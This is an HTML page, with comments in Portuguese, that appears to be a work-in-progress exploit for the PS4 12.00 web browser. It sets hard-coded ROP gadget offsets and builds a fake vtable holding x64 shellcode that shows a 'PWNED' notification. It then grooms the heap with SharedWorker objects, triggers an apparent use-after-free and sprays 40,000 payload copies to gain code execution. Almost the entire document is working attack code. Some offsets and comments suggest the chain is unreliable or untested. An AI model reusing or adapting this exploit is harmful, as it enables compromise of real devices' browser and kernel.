<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 12.00 NOTIFICATION</title>
    
</head>
<body>

    <h1>PS4 12.00 - EXECUÇÃO FINAL</h1>
    <h3>Base Confirmada: 0x800000000</h3>
    <div id="status">Pronto para injeção.</div>
    <div id="log"></div>
    <br>
    <button onclick="run_notify()">DISPARAR NOTIFICAÇÃO</button>

    <script>
        function log(msg) {
            var d = document.getElementById("log");
            d.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            d.scrollTop = d.scrollHeight;
        }

        // =================================================================
        // 1. CONFIGURAÇÃO "GOLDEN" (0x800000000)
        // =================================================================
        // Seus offsets extraídos dos binários
        var BASE = 0x800000000n; 
        
        var GADGETS = {
            // Offsets da LibKernel (Sys)
            pop_rdi: 0x2FEB5n,
            sys_mmap: 0x7500n,  // Syscall 477
            // Offset do Kernel (Gezine)
            jmp_rsi: 0x47b31n   // JMP QWORD PTR [RSI]
        };

        // =================================================================
        // 2. PAYLOAD DE NOTIFICAÇÃO (Assembly x64)
        // =================================================================
        var notify_code = [
            // 1. open("/dev/notification0", O_WRONLY)
            0x48, 0x31, 0xC0,             // xor rax, rax
            0x48, 0x89, 0xC2,             // mov rdx, rax
            0x48, 0x89, 0xC6,             // mov rsi, rax
            0x48, 0x8D, 0x3D, 0x44, 0x00, 0x00, 0x00, // lea rdi, [rip+0x44] -> "/dev/notification0"
            0x48, 0xC7, 0xC0, 0x05, 0x00, 0x00, 0x00, // mov rax, 5 (SYS_open)
            0x0F, 0x05,                   // syscall
            
            // 2. write(fd, buffer, size)
            0x48, 0x89, 0xC7,             // mov rdi, rax (fd)
            0x48, 0x8D, 0x35, 0x45, 0x00, 0x00, 0x00, // lea rsi, [rip+0x45] -> buffer dados
            0x48, 0xC7, 0xC2, 0x30, 0x0C, 0x00, 0x00, // mov rdx, 0xC30 (tamanho)
            0x48, 0xC7, 0xC0, 0x04, 0x00, 0x00, 0x00, // mov rax, 4 (SYS_write)
            0x0F, 0x05,                   // syscall
            
            // 3. close(fd)
            0x48, 0x31, 0xC0,             // xor rax, rax
            0x48, 0xC7, 0xC0, 0x06, 0x00, 0x00, 0x00, // mov rax, 6 (SYS_close)
            0x0F, 0x05,                   // syscall
            
            // 4. Loop Infinito (Trava para não crashar)
            0xEB, 0xFE,                   // jmp $
            
            // --- DADOS ---
            // Path: /dev/notification0
            0x2F, 0x64, 0x65, 0x76, 0x2F, 0x6E, 0x6F, 0x74, 0x69, 0x66, 0x69, 0x63, 0x61, 0x74, 0x69, 0x6F,
            0x6E, 0x30, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            
            // Packet (Estrutura da notificação)
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, // Type, etc
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, // Use Icon = 1
            
            // Mensagem: "PS4 12.00 PWNED"
            0x50, 0x53, 0x34, 0x20, 0x31, 0x32, 0x2E, 0x30, 0x30, 0x20, 0x50, 0x57, 0x4E, 0x45, 0x44, 0x00
        ];

        // =================================================================
        // 3. BUILDER DO OBJETO FALSO
        // =================================================================
        function build_payload() {
            // Tamanho confirmado: 0xA0 (160 bytes)
            // Se o 0xA0 falhou antes, pode ser porque o spray não foi agressivo o suficiente
            // ou porque precisamos do tamanho com header (0xC0). 
            // Vamos manter 0xA0 pois é o tamanho lógico dos dados.
            
            var size = 0xA0; 
            var buffer = new Uint32Array(size / 4);
            var view = new DataView(buffer.buffer);

            // Endereço Absoluto do Gadget
            var jmp_rsi = BASE + GADGETS.jmp_rsi;

            // --- FAKE VTABLE ---
            // Aponta para o JMP RSI.
            // O Kernel executa: CALL [RAX]. RAX aponta para buffer. [RAX] é jmp_rsi.
            // Pula para jmp_rsi. Jmp RSI pula para buffer.
            // Executa o buffer.
            
            for(var i=0; i < size; i+=8) {
                view.setBigUint64(i, jmp_rsi, true); 
            }

            // Inserir Shellcode no corpo do objeto
            // Offset 32 (deixa os primeiros pointers intactos para a vtable)
            var start = 32;
            for(var k=0; k < notify_code.length; k++) {
                if (start+k < buffer.byteLength)
                    view.setUint8(start+k, notify_code[k]);
            }

            return buffer;
        }

        // =================================================================
        // 4. EXECUÇÃO
        // =================================================================
        var workers = [];

        async function run_notify() {
            var payload = build_payload();
            log("Payload construído. Base: " + BASE.toString(16));

            // GROOMING (380)
            log("Grooming...");
            for(let i=0; i<380; i++) {
                try {
                    let w = new SharedWorker("data:text,1", "g"+i);
                    w.port.start();
                    workers.push(w);
                } catch(e){}
            }

            // TRIGGER (403)
            var p_count = 0;
            var limit = 403 - 380;

            var it = setInterval(() => {
                if (p_count >= limit) {
                    clearInterval(it);
                    
                    log("!!! DISPARANDO 403 !!!");
                    var v = workers.pop();
                    var p = v.port;
                    
                    v.port.close();
                    v = null;
                    
                    // SPRAY AGRESSIVO
                    // Aumentando para 40.000 para garantir que o buraco seja tapado
                    log("Spraying...");
                    var spray = [];
                    for(var k=0; k<40000; k++) {
                        // Usamos slice para criar cópia física real
                        spray.push(new Uint32Array(payload));
                    }

                    // TRIGGER DE EXECUÇÃO
                    try { p.postMessage("EXECUTE"); } catch(e){}
                    
                    log("Aguardando notificação...");
                    log("Se aparecer no canto da tela: SUCESSO TOTAL.");
                    return;
                }
                
                let w = new SharedWorker("data:text,1", "v"+p_count);
                w.port.start();
                workers.push(w);
                p_count++;
            }, 100);
        }
    </script>
</body>
</html>

